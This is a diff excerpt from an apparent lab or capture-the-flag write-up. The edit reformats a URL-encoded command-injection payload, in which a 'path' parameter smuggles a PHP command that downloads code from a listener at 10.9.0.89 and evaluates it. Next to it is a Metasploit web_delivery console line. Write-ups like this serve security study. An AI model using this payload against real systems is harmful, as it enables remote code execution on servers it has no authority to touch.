@@ -122,11 +122,11 @@ drwxr-xr-x  14 root   root    4.0K Jul 15 17:11 var
 you can change dirs use the url
 
 
-payload
+The payload I used, URL-encoded so it survives the query string:
 
-
+```text
 http://host1.lxd/index.php?path=/;php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://10.9.0.89:8081/kIf1p9%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22
-
+```
 
 ```console
 sf6 exploit(multi/script/web_delivery) > set lhost 10.9.0.89
